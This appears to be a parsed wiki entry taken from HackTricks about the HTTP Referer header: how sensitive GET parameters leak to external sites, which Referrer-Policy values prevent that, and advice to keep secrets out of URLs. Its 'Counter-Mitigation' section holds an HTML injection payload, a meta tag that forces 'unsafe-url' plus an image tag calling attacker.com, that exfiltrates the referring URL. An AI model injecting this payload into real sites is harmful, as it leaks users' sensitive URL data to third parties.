---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Interesting HTTP

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-todo-interesting-http` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/todo/interesting-http.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Summary

Referrer is the header used by browsers to indicate which was the previous page visited.

## Preserved Body

````markdown
## Referrer headers and policy

Referrer is the header used by browsers to indicate which was the previous page visited.

### Sensitive information leaked

If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.

### Mitigation

You can make the browser follow a **Referrer-policy** that could **avoid** the sensitive information to be sent to other web applications:

```
Referrer-Policy: no-referrer
Referrer-Policy: no-referrer-when-downgrade
Referrer-Policy: origin
Referrer-Policy: origin-when-cross-origin
Referrer-Policy: same-origin
Referrer-Policy: strict-origin
Referrer-Policy: strict-origin-when-cross-origin
Referrer-Policy: unsafe-url
```

### Counter-Mitigation

You can override this rule using an HTML meta tag (the attacker needs to exploit and HTML injection):

```html
<meta name="referrer" content="unsafe-url">
<img src="https://attacker.com">
```

## Defense

Never put any sensitive data inside GET parameters or paths in the URL.
````

## Source Verification

[source record](../../sources/hacktricks/interesting-http.md)

## Evidence Excerpt

```text
_body: '# Interesting HTTP
{{#include ../banners/hacktricks-training.md}}
## Referrer headers and policy
Referrer is the header used by browsers to indicate which was the previous page visited.
### Sensitive information leaked
If at some point inside a web page any sensitive information is located on a GET request parameters, if the page contains
links to external sources or an attacker is able to make/suggest (social engineering) the user visit a URL controlled by
the attacker. It could be able to exfiltrate the sensitive information inside the latest GET request.
```
